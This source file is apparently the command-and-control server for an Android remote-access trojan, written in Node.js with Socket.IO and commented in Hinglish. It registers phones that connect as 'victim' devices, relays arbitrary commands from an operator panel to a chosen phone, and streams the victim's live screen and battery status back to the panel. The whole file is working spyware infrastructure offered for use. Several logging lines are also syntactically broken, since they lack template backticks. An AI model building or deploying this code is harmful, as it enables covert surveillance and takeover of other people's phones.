const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const path = require('path');

const app = express();
const server = http.createServer(app);

// CORS Policy (Cloud deployment ke liye zaroori)
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Static files (panel.html) ko root folder se serve karein
app.use(express.static(__dirname));
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

let devices = [];

io.on("connection", (socket) => {
    console.log([+] Connection established: ${socket.id});

    // ================== BADLAV #1: APK se 'victim_connect' event suno ==================
    socket.on('victim_connect', (data) => {
        const deviceId = socket.id; // Hum server ka socket ID use karenge
        const deviceName = data.deviceName || 'Unknown Device';
        const battery = data.battery || '--';
        
        if (!devices.find(d => d.deviceId === deviceId)) {
            console.log([+] Device registered: ${deviceName} (${deviceId}));
            devices.push({ deviceId, deviceName, battery });
        }
        
        io.emit('devices_list', devices);
    });

    // Panel se aane wale commands ko handle karo aur APK ko bhejo
    // APK 'server_command' event sun raha hai, isliye hum use yahan se bhejenge
    socket.on('panel_command', (command) => {
        if (!command.targetId) return;
        console.log([>] Command '${command.type}' sent to ${command.targetId});
        
        // APK ke hisaab se event ka naam badlo
        const eventType = command.type;
        const eventData = command.data || {};
        
        // 'server_command' ke bajaye, seedhe event bhejo jise APK sun raha hai
        io.to(command.targetId).emit(eventType, eventData);
    });
    
    // ================== BADLAV #2: APK se 'live_screen' event suno ==================
    socket.on('live_screen', (data) => {
        // Panel ko 'live_screen_update' event bhejo
        io.emit('live_screen_update', data);
    });

    // ================== BADLAV #3: APK se 'heartbeat' event suno ==================
    socket.on('heartbeat', (data) => {
        const device = devices.find(d => d.deviceId === socket.id);
        if (device && data.battery) {
            device.battery = data.battery;
            // Panel ko status update bhejo
            io.emit('status_update', { deviceId: socket.id, battery: data.battery });
            // Device list bhi update karo
            io.emit('devices_list', devices);
        }
    });

    // Connection tootne par
    socket.on("disconnect", () => {
        console.log([-] Connection lost: ${socket.id});
        devices = devices.filter(d => d.deviceId !== socket.id);
        io.emit('devices_list', devices);
    });
});

// Dynamic Port (Render ke liye zaroori)
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(Server is listening on port ${PORT});
});
